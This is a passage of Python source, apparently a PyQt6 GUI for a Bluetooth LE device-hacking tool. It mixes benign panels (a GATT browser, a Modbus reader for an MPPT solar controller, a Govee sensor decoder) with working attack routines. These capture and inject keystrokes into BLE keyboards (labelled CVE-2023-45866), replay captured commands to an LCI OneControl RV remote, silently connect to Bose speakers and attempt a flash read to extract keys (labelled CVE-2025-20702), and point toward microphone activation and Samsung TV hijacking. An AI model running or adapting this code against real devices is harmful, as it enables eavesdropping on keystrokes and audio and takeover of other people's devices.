        if data[0] == "characteristic":
            char = data[1]

            if char.can_read:
                read_action = QAction("Read Value", self)
                read_action.triggered.connect(self.read_selected_characteristic)
                menu.addAction(read_action)

            if char.can_write or char.can_write_no_response:
                write_action = QAction("Write Value...", self)
                write_action.triggered.connect(self._prompt_write_value)
                menu.addAction(write_action)

            if char.can_notify or char.can_indicate:
                notify_action = QAction("Subscribe to Notifications", self)
                notify_action.triggered.connect(self.subscribe_notifications)
                menu.addAction(notify_action)

            menu.addSeparator()

            copy_uuid_action = QAction("Copy UUID", self)
            copy_uuid_action.triggered.connect(lambda: self._copy_to_clipboard(char.uuid))
            menu.addAction(copy_uuid_action)

        menu.exec(self.gatt_tree.viewport().mapToGlobal(position))

    def _prompt_write_value(self):
        """Prompt for value to write"""
        value, ok = QInputDialog.getText(
            self, "Write Value",
            "Enter hex value to write (e.g., 01020304):"
        )
        if ok and value:
            self.write_input.setText(value)
            self.write_type.setCurrentIndex(0)  # Hex
            self.write_selected_characteristic()

    def _copy_to_clipboard(self, text: str):
        """Copy text to clipboard"""
        from PyQt6.QtWidgets import QApplication
        QApplication.clipboard().setText(text)
        self.log(f"Copied: {text}")

    def export_device_json(self):
        """Export current device data as JSON"""
        if not self.current_device or not self.bt_service:
            return

        filename, _ = QFileDialog.getSaveFileName(
            self, "Export Device JSON",
            f"{self.current_device.name or self.current_device.mac_address.replace(':', '')}_gatt.json",
            "JSON Files (*.json)"
        )

        if filename:
            json_str = self.bt_service.export_device_json(self.current_device)
            with open(filename, 'w') as f:
                f.write(json_str)
            self.log(f"[+] Exported to {filename}")

    def generate_controller(self):
        """Generate Python controller for current device"""
        if not self.current_device or not self.bt_service:
            return

        filename, _ = QFileDialog.getSaveFileName(
            self, "Save Controller",
            f"{self.current_device.name or 'device'}_controller.py".replace(" ", "_").lower(),
            "Python Files (*.py)"
        )

        if filename:
            code = self.bt_service.generate_controller_template(self.current_device)
            with open(filename, 'w') as f:
                f.write(code)
            self.log(f"[+] Controller generated: {filename}")
            QMessageBox.information(
                self, "Controller Generated",
                f"Python controller saved to:\n{filename}\n\n"
                "This file contains a ready-to-use BLE controller class with "
                "methods for all discovered characteristics."
            )

    # ==== HM-10 Known Service Controls ====

    def _send_hm10_data(self):
        """Send data via HM-10 Serial service (0xFFE0 / 0xFFE1)"""
        if not self.current_device or not self.bt_service:
            self.log("[!] No device connected")
            return

        text = self.hm10_input.text()
        if not text:
            return

        # Add newline if checkbox is checked
        if self.hm10_newline.isChecked():
            text += '\n'

        mac = self.current_device.mac_address
        # HM-10 uses FFE1 characteristic for TX/RX
        char_uuid = "0000ffe1-0000-1000-8000-00805f9b34fb"

        self.log(f"[*] Sending to HM-10: {repr(text)}")

        async def do_send():
            try:
                value = text.encode('utf-8')
                success = await self.bt_service.write_characteristic(
                    mac, char_uuid, value, with_response=False
                )
                if success:
                    self.bridge.log_signal.emit(f"[+] HM-10 TX: {repr(text.strip())}")
                else:
                    self.bridge.log_signal.emit("[!] HM-10 write failed")
            except Exception as e:
                self.bridge.log_signal.emit(f"[!] HM-10 send error: {e}")

        self._run_async(do_send())
        self.hm10_input.clear()

    def _subscribe_hm10(self):
        """Subscribe to HM-10 notifications (0xFFE1)"""
        if not self.current_device or not self.bt_service:
            self.log("[!] No device connected")
            return

        mac = self.current_device.mac_address
        char_uuid = "0000ffe1-0000-1000-8000-00805f9b34fb"

        self.log(f"[*] Subscribing to HM-10 notifications...")
        self.hm10_subscribe_btn.setEnabled(False)
        self.hm10_subscribe_btn.setText("Subscribed (30s)")

        def notification_callback(uuid: str, data: bytes):
            try:
                decoded = data.decode('utf-8', errors='replace')
                self.bridge.log_signal.emit(f"[HM-10 RX] {decoded}")
                # Append to receive area (via signal to be thread-safe)
                QTimer.singleShot(0, lambda: self.hm10_receive.append(decoded.strip()))
            except Exception as e:
                self.bridge.log_signal.emit(f"[HM-10 RX] (hex) {data.hex()}")

        async def do_subscribe():
            try:
                await self.bt_service.subscribe_notifications(
                    mac, char_uuid, notification_callback, duration=30.0
                )
                self.bridge.log_signal.emit("[*] HM-10 subscription ended")
            except Exception as e:
                self.bridge.log_signal.emit(f"[!] HM-10 subscribe error: {e}")
            finally:
                # Re-enable button after subscription ends
                QTimer.singleShot(0, lambda: self._reset_hm10_subscribe_btn())

        self._run_async(do_subscribe())

    def _reset_hm10_subscribe_btn(self):
        """Reset HM-10 subscribe button state"""
        self.hm10_subscribe_btn.setEnabled(True)
        self.hm10_subscribe_btn.setText("Subscribe to Notifications")

    def _detect_known_services(self, device_data):
        """Detect known services and enable corresponding controls"""
        # Hide all device panels first
        self.mppt_group.setVisible(False)
        self.ks03_group.setVisible(False)
        self.bose_group.setVisible(False)
        self.lci_group.setVisible(False)
        self.samsung_group.setVisible(False)
        self.govee_group.setVisible(False)

        if not device_data:
            return

        detected_services = []
        has_hm10 = False
        has_hid = False
        is_mppt = False

        # Check device name for known device types
        device_name = (device_data.name or "").upper()

        # Detect MPPT controller
        if "GP-RVC" in device_name or "MPPT" in device_name or "RENOGY" in device_name:
            is_mppt = True

        # Detect KS03 keyboard
        is_ks03 = "KS03" in device_name or "KEYBOARD" in device_name

        # Detect Bose speaker
        is_bose = "BOSE" in device_name or "SOUNDLINK" in device_name

        # Detect LCI OneControl
        is_lci = "LCI" in device_name or "ONECONTROL" in device_name

        # Detect Samsung TV
        is_samsung = "SAMSUNG" in device_name or "[TV]" in device_name

        # Detect Govee sensor
        is_govee = "GOVEE" in device_name or "GVH" in device_name

        if device_data.services:
            for service in device_data.services:
                uuid_lower = service.uuid.lower()
                uuid_short = service.uuid_short.lower() if service.uuid_short else ""

                # HM-10 Serial Module (0xFFE0)
                if 'ffe0' in uuid_lower or 'ffe0' in uuid_short:
                    has_hm10 = True
                    detected_services.append("HM-10 Serial (0xFFE0)")
                    self.hm10_send_btn.setEnabled(True)
                    self.hm10_subscribe_btn.setEnabled(True)
                    self.hm10_input.setEnabled(True)

                # HID Service (0x1812)
                if '1812' in uuid_lower or '1812' in uuid_short:
                    has_hid = True
                    detected_services.append("HID Service (0x1812)")

                # Heart Rate Service (0x180D)
                if '180d' in uuid_lower or '180d' in uuid_short:
                    detected_services.append("Heart Rate (0x180D)")

                # Battery Service (0x180F)
                if '180f' in uuid_lower or '180f' in uuid_short:
                    detected_services.append("Battery (0x180F)")

                # Device Information (0x180A)
                if '180a' in uuid_lower or '180a' in uuid_short:
                    detected_services.append("Device Information (0x180A)")

                # AFD0 service (KS03 specific)
                if 'afd0' in uuid_lower:
                    is_ks03 = True
                    detected_services.append("KS03 HID Service (AFD0)")

        # Enable GP-RVC MPPT controller if detected
        if is_mppt and has_hm10:
            detected_services.append("GP-RVC MPPT Solar Controller")
            self.mppt_group.setVisible(True)
            self.mppt_connect_btn.setEnabled(True)
            self.mppt_status_btn.setEnabled(True)
            self.mppt_battery_btn.setEnabled(True)
            self.mppt_solar_btn.setEnabled(True)
            self.mppt_load_btn.setEnabled(True)
            self.mppt_history_btn.setEnabled(True)
            self.mppt_raw_send_btn.setEnabled(True)
            self.mppt_status.clear()
            self.mppt_status.append(f"Device: {device_data.name}")
            self.mppt_status.append(f"MAC: {device_data.mac_address}")
            self.mppt_status.append("Ready - Click 'Connect & Subscribe' to start")

        # Enable KS03 keyboard panel
        if is_ks03 or has_hid:
            detected_services.append("BLE Keyboard (HID Injection)")
            self.ks03_group.setVisible(True)
            self.ks03_connect_btn.setEnabled(True)
            self.ks03_status.clear()
            self.ks03_status.append(f"Target: {device_data.name}")
            self.ks03_status.append(f"MAC: {device_data.mac_address}")
            self.ks03_status.append("[!] CVE-2023-45866 - Unauthenticated HID injection")

        # Enable Bose speaker panel
        if is_bose:
            detected_services.append("Bose Speaker (RACE Protocol)")
            self.bose_group.setVisible(True)
            self.bose_connect_btn.setEnabled(True)
            self.bose_status.clear()
            self.bose_status.append(f"Target: {device_data.name}")
            self.bose_status.append(f"MAC: {device_data.mac_address}")
            self.bose_status.append("[!] CVE-2025-20700/20701/20702 - Airoha chip exploit")

        # Enable LCI remote panel
        if is_lci:
            detected_services.append("LCI OneControl (Replay Attack)")
            self.lci_group.setVisible(True)
            self.lci_connect_btn.setEnabled(True)
            self.lci_status.clear()
            self.lci_status.append(f"Target: {device_data.name}")
            self.lci_status.append(f"MAC: {device_data.mac_address}")
            self.lci_status.append("[!] Unencrypted commands - replay possible")

        # Enable Samsung TV panel
        if is_samsung:
            detected_services.append("Samsung Smart TV (EvilScreen)")
            self.samsung_group.setVisible(True)
            self.samsung_connect_btn.setEnabled(True)
            self.samsung_status.clear()
            self.samsung_status.append(f"Target: {device_data.name}")
            self.samsung_status.append(f"MAC: {device_data.mac_address}")
            self.samsung_status.append("[!] BLE remote control hijacking")

        # Enable Govee sensor panel
        if is_govee:
            detected_services.append("Govee Sensor (Unencrypted)")
            self.govee_group.setVisible(True)
            self.govee_sniff_btn.setEnabled(True)
            self.govee_decode_btn.setEnabled(True)
            self.govee_status.clear()
            self.govee_status.append(f"Target: {device_data.name}")
            self.govee_status.append(f"MAC: {device_data.mac_address}")
            self.govee_status.append("[*] Unencrypted temp/humidity broadcasts")

        # Update Known Services info label
        if detected_services:
            self.known_services_info.setText(
                f"Detected known services:\n• " + "\n• ".join(detected_services)
            )
            self.known_services_info.setStyleSheet("padding: 10px; color: #00aa00;")
        else:
            self.known_services_info.setText("No known services detected on this device.")
            self.known_services_info.setStyleSheet("padding: 10px; color: gray;")

    # ==== GP-RVC MPPT Solar Controller Methods ====

    def _mppt_connect(self):
        """Connect to MPPT with persistent connection and subscribe to notifications"""
        if not self.current_device or not self.bt_service:
            self.log("[!] No device selected")
            return

        mac = self.current_device.mac_address
        notify_uuid = "0000ffe1-0000-1000-8000-00805f9b34fb"

        self.log(f"[*] Connecting to MPPT controller {mac}...")
        self.mppt_status.append("\n[*] Establishing persistent connection...")
        self.mppt_connect_btn.setEnabled(False)
        self.mppt_connect_btn.setText("Connecting...")

        def notification_callback(uuid: str, data: bytes):
            # Parse MPPT response
            self._mppt_parse_response(data)

        async def do_connect():
            try:
                # Disconnect from any existing connection first
                if self.bt_service.is_connected_persistent():
                    await self.bt_service.disconnect_persistent()
                    await asyncio.sleep(0.5)

                # Use persistent connection
                connected = await self.bt_service.connect_persistent(mac)
                if connected:
                    self.bridge.log_signal.emit(f"[+] Persistent connection established")
                    QTimer.singleShot(0, lambda: self._update_connection_status(self.current_device.name or mac))
                    # Subscribe to notifications
                    subscribed = await self.bt_service.subscribe_persistent(
                        notify_uuid, notification_callback
                    )
                    if subscribed:
                        self.bridge.log_signal.emit(f"[+] Subscribed to MPPT notifications")
                        QTimer.singleShot(0, lambda: self._mppt_connected())
                    else:
                        self.bridge.log_signal.emit("[!] Failed to subscribe")
                        QTimer.singleShot(0, lambda: self._mppt_reset_connect_btn())
                else:
                    self.bridge.log_signal.emit("[!] Failed to connect")
                    QTimer.singleShot(0, lambda: self._mppt_reset_connect_btn())
                    QTimer.singleShot(0, lambda: self._update_connection_status(None))
            except Exception as e:
                self.bridge.log_signal.emit(f"[!] MPPT connect error: {e}")
                QTimer.singleShot(0, lambda: self._mppt_reset_connect_btn())
                QTimer.singleShot(0, lambda: self._update_connection_status(None))

        self._run_async(do_connect())

    def _mppt_connected(self):
        """Update UI when MPPT is connected"""
        self.mppt_connect_btn.setText("Disconnect")
        self.mppt_connect_btn.setEnabled(True)
        self.mppt_connect_btn.clicked.disconnect()
        self.mppt_connect_btn.clicked.connect(self._mppt_disconnect)
        self.mppt_status.append("[+] Connected - Ready to send commands")

    def _mppt_disconnect(self):
        """Disconnect from MPPT controller"""
        if not self.bt_service:
            return

        self.log("[*] Disconnecting from MPPT...")

        async def do_disconnect():
            try:
                await self.bt_service.disconnect_persistent()
                self.bridge.log_signal.emit("[*] Disconnected from MPPT")
            except Exception as e:
                self.bridge.log_signal.emit(f"[!] Disconnect error: {e}")
            finally:
                QTimer.singleShot(0, lambda: self._mppt_reset_connect_btn())
                QTimer.singleShot(0, lambda: self._update_connection_status(None))

        self._run_async(do_disconnect())

    def _mppt_reset_connect_btn(self):
        """Reset MPPT connect button"""
        try:
            self.mppt_connect_btn.clicked.disconnect()
        except:
            pass
        self.mppt_connect_btn.clicked.connect(self._mppt_connect)
        self.mppt_connect_btn.setEnabled(True)
        self.mppt_connect_btn.setText("Connect & Subscribe")

    def _mppt_send_command(self, command_hex: str, description: str = ""):
        """Send a hex command to the MPPT controller using persistent connection"""
        if not self.current_device or not self.bt_service:
            self.log("[!] No device - interrogate first")
            return

        # Check if we have a persistent connection
        if not self.bt_service.is_connected_persistent(self.current_device.mac_address):
            self.log("[!] Not connected - click 'Connect & Subscribe' first")
            self.mppt_status.append("[!] Not connected - click Connect first")
            return

        # Use FFE2 for write (TX) as per the device profile
        char_uuid = "0000ffe2-0000-1000-8000-00805f9b34fb"

        self.log(f"[*] MPPT TX: {command_hex} ({description})")
        self.mppt_status.append(f"TX: {command_hex}")

        async def do_send():
            try:
                value = bytes.fromhex(command_hex.replace(" ", ""))
                success = await self.bt_service.write_persistent(char_uuid, value, with_response=False)
                if success:
                    self.bridge.log_signal.emit(f"[+] MPPT command sent: {description}")
                else:
                    self.bridge.log_signal.emit("[!] MPPT write failed")
            except Exception as e:
                self.bridge.log_signal.emit(f"[!] MPPT send error: {e}")

        self._run_async(do_send())

    def _mppt_parse_response(self, data: bytes):
        """Parse MPPT controller response data"""
        hex_str = data.hex()
        self.bridge.log_signal.emit(f"[MPPT RX] {hex_str}")

        # Display raw hex
        QTimer.singleShot(0, lambda: self.mppt_status.append(f"RX: {hex_str}"))

        # Try to parse Modbus-style response
        # Renogy MPPT typically uses Modbus RTU format
        if len(data) >= 5:
            try:
                # Modbus: [addr][func][len][data...][crc16]
                addr = data[0]
                func = data[1]
                if func == 0x03:  # Read holding registers response
                    byte_count = data[2]
                    payload = data[3:3+byte_count]
                    self._mppt_parse_registers(payload)
            except Exception as e:
                self.bridge.log_signal.emit(f"[MPPT] Parse error: {e}")

    def _mppt_parse_registers(self, payload: bytes):
        """Parse Modbus register data from MPPT"""
        # Parse common Renogy MPPT registers
        if len(payload) >= 2:
            parsed = []
            for i in range(0, len(payload) - 1, 2):
                val = (payload[i] << 8) | payload[i+1]
                parsed.append(val)

            info = f"Registers: {parsed}"
            QTimer.singleShot(0, lambda: self.mppt_status.append(info))

    def _mppt_get_status(self):
        """Get MPPT controller status"""
        # Renogy Modbus: Read status registers starting at 0x0100
        # Format: [DevAddr][0x03][StartHi][StartLo][CountHi][CountLo][CRC16]
        # Device address is typically 0xFF or 0x01
        cmd = self._mppt_build_read_cmd(0x0100, 10)
        self._mppt_send_command(cmd, "Get Status")

    def _mppt_get_battery(self):
        """Get battery voltage and SOC"""
        # Battery info typically at registers 0x0101-0x0103
        cmd = self._mppt_build_read_cmd(0x0101, 4)
        self._mppt_send_command(cmd, "Battery Info")

    def _mppt_get_solar(self):
        """Get solar panel input voltage and current"""
        # Solar input typically at registers 0x0107-0x0109
        cmd = self._mppt_build_read_cmd(0x0107, 4)
        self._mppt_send_command(cmd, "Solar Input")

    def _mppt_get_load(self):
        """Get load output status"""
        # Load status typically at registers 0x010A-0x010C
        cmd = self._mppt_build_read_cmd(0x010A, 4)
        self._mppt_send_command(cmd, "Load Status")

    def _mppt_get_history(self):
        """Get daily statistics"""
        # Daily stats typically at registers 0x0111-0x0115
        cmd = self._mppt_build_read_cmd(0x0111, 8)
        self._mppt_send_command(cmd, "Daily Stats")

    def _mppt_send_raw(self):
        """Send raw hex command to MPPT"""
        raw = self.mppt_raw_input.text().strip()
        if raw:
            self._mppt_send_command(raw, "Raw Command")
            self.mppt_raw_input.clear()

    def _mppt_build_read_cmd(self, start_reg: int, count: int) -> str:
        """Build Modbus read holding registers command with CRC"""
        # Device address 0xFF (common for BLE MPPT)
        cmd = bytes([0xFF, 0x03,
                     (start_reg >> 8) & 0xFF, start_reg & 0xFF,
                     (count >> 8) & 0xFF, count & 0xFF])
        crc = self._mppt_calc_crc(cmd)
        cmd = cmd + bytes([crc & 0xFF, (crc >> 8) & 0xFF])
        return cmd.hex()

    def _mppt_calc_crc(self, data: bytes) -> int:
        """Calculate Modbus CRC16"""
        crc = 0xFFFF
        for byte in data:
            crc ^= byte
            for _ in range(8):
                if crc & 0x0001:
                    crc = (crc >> 1) ^ 0xA001
                else:
                    crc >>= 1
        return crc

    # ============================================================
    # KS03 Keyboard HID Methods
    # ============================================================

    def _ks03_connect(self):
        """Connect to KS03 keyboard"""
        if not self.current_device or not self.bt_service:
            self.log("[!] No KS03 device selected")
            return
        mac = self.current_device.mac_address
        name = self.current_device.name or mac
        self.log(f"[*] Connecting to KS03 {mac}...")
        self.ks03_status.append(f"Connecting to {mac}...")
        self.ks03_connect_btn.setEnabled(False)

        async def do_connect():
            try:
                # Disconnect from any existing connection first
                if self.bt_service.is_connected_persistent():
                    await self.bt_service.disconnect_persistent()
                    await asyncio.sleep(0.5)

                connected = await self.bt_service.connect_persistent(mac)
                if connected:
                    QTimer.singleShot(0, lambda: self._ks03_connected())
                    QTimer.singleShot(0, lambda: self._update_connection_status(name))
                else:
                    QTimer.singleShot(0, lambda: self.ks03_connect_btn.setEnabled(True))
                    QTimer.singleShot(0, lambda: self._update_connection_status(None))
            except Exception as e:
                self.bridge.log_signal.emit(f"[!] {e}")
                QTimer.singleShot(0, lambda: self.ks03_connect_btn.setEnabled(True))
                QTimer.singleShot(0, lambda: self._update_connection_status(None))
        self._run_async(do_connect())

    def _ks03_connected(self):
        self.ks03_connect_btn.setText("Disconnect")
        self.ks03_connect_btn.setEnabled(True)
        self.ks03_connect_btn.clicked.disconnect()
        self.ks03_connect_btn.clicked.connect(self._ks03_disconnect)
        self.ks03_read_btn.setEnabled(True)
        self.ks03_subscribe_btn.setEnabled(True)
        self.ks03_inject_btn.setEnabled(True)
        self.ks03_status.append("[+] Connected! Service AFD0 ready")

    def _ks03_disconnect(self):
        async def do_disconnect():
            await self.bt_service.disconnect_persistent()
            QTimer.singleShot(0, lambda: self._ks03_disconnected())
            QTimer.singleShot(0, lambda: self._update_connection_status(None))
        self._run_async(do_disconnect())

    def _ks03_disconnected(self):
        self.ks03_connect_btn.setText("Connect")
        self.ks03_connect_btn.clicked.disconnect()
        self.ks03_connect_btn.clicked.connect(self._ks03_connect)
        self.ks03_read_btn.setEnabled(False)
        self.ks03_subscribe_btn.setEnabled(False)
        self.ks03_inject_btn.setEnabled(False)

    def _ks03_read_state(self):
        """Read KS03 state"""
        async def do_read():
            try:
                data = await self.bt_service.read_persistent("0000afd3-0000-1000-8000-00805f9b34fb")
                if data:
                    QTimer.singleShot(0, lambda: self.ks03_status.append(f"State: {data.hex()}"))
            except Exception as e:
                self.bridge.log_signal.emit(f"[!] {e}")
        self._run_async(do_read())

    def _ks03_capture_keys(self):
        """Capture keystrokes from KS03"""
        if self.ks03_subscribe_btn.text() == "Capture Keys":
            def on_key(uuid: str, data: bytes):
                ts = QDateTime.currentDateTime().toString("hh:mm:ss")
                # Use signal to safely update GUI
                self.bridge.log_signal.emit(f"[KEY] {ts}: {data.hex()}")

            async def do_sub():
                try:
                    await self.bt_service.subscribe_persistent("0000afd2-0000-1000-8000-00805f9b34fb", on_key)
                    QTimer.singleShot(0, lambda: self.ks03_subscribe_btn.setText("Stop Capture"))
                    QTimer.singleShot(0, lambda: self.ks03_status.append("[*] Capturing keystrokes..."))
                except Exception as e:
                    self.bridge.log_signal.emit(f"[!] {e}")
            self._run_async(do_sub())
        else:
            async def do_unsub():
                try:
                    await self.bt_service.unsubscribe_persistent("0000afd2-0000-1000-8000-00805f9b34fb")
                except:
                    pass
                QTimer.singleShot(0, lambda: self.ks03_subscribe_btn.setText("Capture Keys"))
            self._run_async(do_unsub())

    def _ks03_inject_keys(self):
        """Inject keystrokes"""
        text = self.ks03_inject_input.text().strip()
        if not text:
            return
        self.ks03_inject_input.clear()

        # Simple char to HID keycode
        keycodes = {c: 0x04 + i for i, c in enumerate('abcdefghijklmnopqrstuvwxyz')}
        keycodes.update({str(i): 0x1E + i for i in range(10)})
        keycodes[' '] = 0x2C

        async def do_inject():
            try:
                for char in text.lower():
                    if char in keycodes:
                        report = bytes([0, 0, keycodes[char], 0, 0, 0, 0, 0])
                        await self.bt_service.write_persistent("0000afd1-0000-1000-8000-00805f9b34fb", report, False)
                        await asyncio.sleep(0.03)
                        await self.bt_service.write_persistent("0000afd1-0000-1000-8000-00805f9b34fb", bytes(8), False)
                        await asyncio.sleep(0.02)
                QTimer.singleShot(0, lambda: self.ks03_status.append(f"[+] Injected: {text}"))
            except Exception as e:
                self.bridge.log_signal.emit(f"[!] {e}")
        self._run_async(do_inject())

    # ============================================================
    # Govee Sensor Methods
    # ============================================================

    def _govee_capture(self):
        """Capture Govee broadcasts"""
        self.govee_status.clear()
        self.govee_status.append("[*] Scanning for Govee broadcasts (10s)...")
        self._govee_data = []

        async def do_capture():
            try:
                from bleak import BleakScanner
                def on_detect(dev, adv):
                    name = dev.name or adv.local_name or ""
                    if "GVH" in name.upper() or "GOVEE" in name.upper():
                        for mid, data in adv.manufacturer_data.items():
                            if len(data) >= 6:
                                th = (data[3] << 16) | (data[4] << 8) | data[5]
                                temp_c = th / 10000
                                temp_f = temp_c * 9/5 + 32
                                hum = (th % 1000) / 10
                                self._govee_data.append({'name': name, 'temp_f': temp_f, 'humidity': hum})
                                msg = f"[{name}] {temp_f:.1f}F, {hum:.1f}% RH"
                                QTimer.singleShot(0, lambda m=msg: self.govee_status.append(m))

                scanner = BleakScanner(on_detect)
                await scanner.start()
                await asyncio.sleep(10)
                await scanner.stop()
                QTimer.singleShot(0, lambda: self.govee_status.append(f"\n[+] Done: {len(self._govee_data)} readings"))
            except Exception as e:
                self.bridge.log_signal.emit(f"[!] {e}")
        self._run_async(do_capture())

    def _govee_decode(self):
        if hasattr(self, '_govee_data') and self._govee_data:
            self.govee_status.clear()
            for d in self._govee_data:
                self.govee_status.append(f"{d['name']}: {d['temp_f']:.1f}F, {d['humidity']:.1f}%")
        else:
            self.govee_status.append("[!] No data captured yet")

    def _govee_spoof(self):
        self.govee_status.append("\n[*] Spoofing requires ESP32 or hcitool advertising")
        self.govee_status.append("Example: sudo hcitool -i hci0 cmd 0x08 0x0008 ...")

    # ============================================================
    # LCI Remote Methods
    # ============================================================

    def _lci_connect(self):
        if not self.current_device:
            return
        mac = self.current_device.mac_address
        self._lci_cmds = []
        self.lci_connect_btn.setEnabled(False)

        async def do_connect():
            try:
                # Disconnect from any existing connection first
                if self.bt_service.is_connected_persistent():
                    await self.bt_service.disconnect_persistent()
                    await asyncio.sleep(0.5)

                if await self.bt_service.connect_persistent(mac):
                    QTimer.singleShot(0, lambda: self._lci_connected())
                    QTimer.singleShot(0, lambda: self._update_connection_status(self.current_device.name or mac))
                else:
                    QTimer.singleShot(0, lambda: self.lci_connect_btn.setEnabled(True))
                    QTimer.singleShot(0, lambda: self._update_connection_status(None))
            except Exception as e:
                self.bridge.log_signal.emit(f"[!] {e}")
                QTimer.singleShot(0, lambda: self.lci_connect_btn.setEnabled(True))
                QTimer.singleShot(0, lambda: self._update_connection_status(None))
        self._run_async(do_connect())

    def _lci_connected(self):
        self.lci_connect_btn.setText("Disconnect")
        self.lci_connect_btn.setEnabled(True)
        self.lci_connect_btn.clicked.disconnect()
        self.lci_connect_btn.clicked.connect(self._lci_disconnect)
        self.lci_capture_btn.setEnabled(True)
        self.lci_replay_btn.setEnabled(True)
        self.lci_status.append("[+] Connected to LCI remote")

    def _lci_disconnect(self):
        async def do_disconnect():
            await self.bt_service.disconnect_persistent()
            QTimer.singleShot(0, lambda: self._lci_disconnected())
            QTimer.singleShot(0, lambda: self._update_connection_status(None))
        self._run_async(do_disconnect())

    def _lci_disconnected(self):
        self.lci_connect_btn.setText("Connect")
        self.lci_connect_btn.clicked.disconnect()
        self.lci_connect_btn.clicked.connect(self._lci_connect)
        self.lci_capture_btn.setEnabled(False)
        self.lci_replay_btn.setEnabled(False)

    def _lci_capture(self):
        def on_cmd(uuid: str, data: bytes):
            self._lci_cmds.append(data)
            QTimer.singleShot(0, lambda: self.lci_commands_list.append(data.hex()))

        async def do_cap():
            try:
                await self.bt_service.subscribe_persistent("00000042-0200-a58e-e411-afe28044e62c", on_cmd)
                QTimer.singleShot(0, lambda: self.lci_status.append("[*] Capture active"))
            except Exception as e:
                self.bridge.log_signal.emit(f"[!] {e}")
        self._run_async(do_cap())

    def _lci_replay(self):
        if not hasattr(self, '_lci_cmds') or not self._lci_cmds:
            return
        cmd = self._lci_cmds[-1]

        async def do_replay():
            try:
                await self.bt_service.write_persistent("00000041-0200-a58e-e411-afe28044e62c", cmd, False)
                QTimer.singleShot(0, lambda: self.lci_status.append(f"[REPLAYED] {cmd.hex()}"))
            except Exception as e:
                self.bridge.log_signal.emit(f"[!] {e}")
        self._run_async(do_replay())

    # ============================================================
    # Bose Speaker Methods (CVE-2025-20700)
    # ============================================================

    def _bose_connect(self):
        if not self.current_device:
            return
        mac = self.current_device.mac_address
        self.bose_status.append(f"[*] Silent connect to {mac}")
        self.bose_connect_btn.setEnabled(False)

        async def do_connect():
            try:
                # Disconnect from any existing connection first
                if self.bt_service.is_connected_persistent():
                    await self.bt_service.disconnect_persistent()
                    await asyncio.sleep(0.5)

                if await self.bt_service.connect_persistent(mac):
                    QTimer.singleShot(0, lambda: self._bose_connected())
                    QTimer.singleShot(0, lambda: self._update_connection_status(self.current_device.name or mac))
                else:
                    QTimer.singleShot(0, lambda: self.bose_connect_btn.setEnabled(True))
                    QTimer.singleShot(0, lambda: self._update_connection_status(None))
            except Exception as e:
                self.bridge.log_signal.emit(f"[!] {e}")
                QTimer.singleShot(0, lambda: self.bose_connect_btn.setEnabled(True))
                QTimer.singleShot(0, lambda: self._update_connection_status(None))
        self._run_async(do_connect())

    def _bose_connected(self):
        self.bose_connect_btn.setText("Disconnect")
        self.bose_connect_btn.setEnabled(True)
        self.bose_connect_btn.clicked.disconnect()
        self.bose_connect_btn.clicked.connect(self._bose_disconnect)
        self.bose_enum_btn.setEnabled(True)
        self.bose_extract_btn.setEnabled(True)
        self.bose_audio_btn.setEnabled(True)
        self.bose_mic_btn.setEnabled(True)
        self.bose_status.append("[+] Connected! RACE protocol accessible")

    def _bose_disconnect(self):
        async def do_disconnect():
            await self.bt_service.disconnect_persistent()
            QTimer.singleShot(0, lambda: self._bose_disconnected())
            QTimer.singleShot(0, lambda: self._update_connection_status(None))
        self._run_async(do_disconnect())

    def _bose_disconnected(self):
        self.bose_connect_btn.setText("Silent Connect")
        self.bose_connect_btn.clicked.disconnect()
        self.bose_connect_btn.clicked.connect(self._bose_connect)
        for btn in [self.bose_enum_btn, self.bose_extract_btn, self.bose_audio_btn, self.bose_mic_btn]:
            btn.setEnabled(False)

    def _bose_enum_race(self):
        self.bose_status.append("[*] Enumerating RACE protocol...")
        async def do_enum():
            for uuid in ["9ec813b4-256b-4090-93a8-a4f0e9107733", "d417c028-9818-4354-99d1-2ac09d074591"]:
                try:
                    data = await self.bt_service.read_persistent(uuid)
                    if data:
                        QTimer.singleShot(0, lambda d=data, u=uuid[:8]: self.bose_status.append(f"  [{u}]: {d.hex()}"))
                except:
                    pass
        self._run_async(do_enum())

    def _bose_extract_keys(self):
        self.bose_status.append("[*] Attempting flash read (CVE-2025-20702)...")
        async def do_extract():
            try:
                await self.bt_service.write_persistent("d417c028-9818-4354-99d1-2ac09d074591", bytes([0x05, 0x00, 0x00, 0x10]), False)
                await asyncio.sleep(0.3)
                data = await self.bt_service.read_persistent("9ec813b4-256b-4090-93a8-a4f0e9107733")
                if data:
                    QTimer.singleShot(0, lambda: self.bose_status.append(f"  Response: {data.hex()}"))
            except Exception as e:
                QTimer.singleShot(0, lambda: self.bose_status.append(f"  [!] {e}"))
        self._run_async(do_extract())

    def _bose_hijack_audio(self):
        self.bose_status.append("[*] Audio hijack requires BR/EDR + extracted link keys")

    def _bose_activate_mic(self):
        self.bose_status.append("[!] Mic: Impersonate device to phone, send AT+BVRA=1")

    # ============================================================
    # Samsung TV Methods
    # ============================================================

    def _samsung_ble_spam(self):
        self.samsung_status.append("[*] BLE Spam: Use ESP32 Marauder or hcitool")
        self.samsung_status.append("    Sends fake watch pairing requests")

    def _samsung_inject_keys(self):
        keys = self.samsung_cmd_input.text().strip() or "UP DOWN ENTER"
        self.samsung_status.append(f"[*] CVE-2023-45866 injection: {keys}")
        tv_keys = {'UP': 0x52, 'DOWN': 0x51, 'LEFT': 0x50, 'RIGHT': 0x4F, 'ENTER': 0x28}
        codes = [f"0x{tv_keys.get(k.upper(), 0):02X}" for k in keys.split()]
        self.samsung_status.append(f"    HID codes: {' '.join(codes)}")

    def _samsung_mitm(self):
        self.samsung_status.append("[*] EvilScreen: SmartThings UUID unprotected")
        self.samsung_status.append("    PSK keyspace 10^8 - crackable")

    def _samsung_connect(self):
        """Connect to Samsung TV"""
        if not self.current_device:
            return
        mac = self.current_device.mac_address
        self.samsung_status.append(f"[*] Connecting to {mac}...")

        async def do_connect():
            try:
                if self.bt_service.is_connected_persistent():
                    await self.bt_service.disconnect_persistent()
                    await asyncio.sleep(0.5)

                if await self.bt_service.connect_persistent(mac):
                    QTimer.singleShot(0, lambda: self._samsung_connected())
                    QTimer.singleShot(0, lambda: self._update_connection_status(self.current_device.name or mac))
                else:
                    QTimer.singleShot(0, lambda: self.samsung_connect_btn.setEnabled(True))
            except Exception as e:
                self.bridge.log_signal.emit(f"[!] {e}")
        self._run_async(do_connect())

    def _samsung_connected(self):
        self.samsung_connect_btn.setText("Disconnect")
        self.samsung_connect_btn.clicked.disconnect()
        self.samsung_connect_btn.clicked.connect(self._samsung_disconnect)
        self.samsung_pair_btn.setEnabled(True)
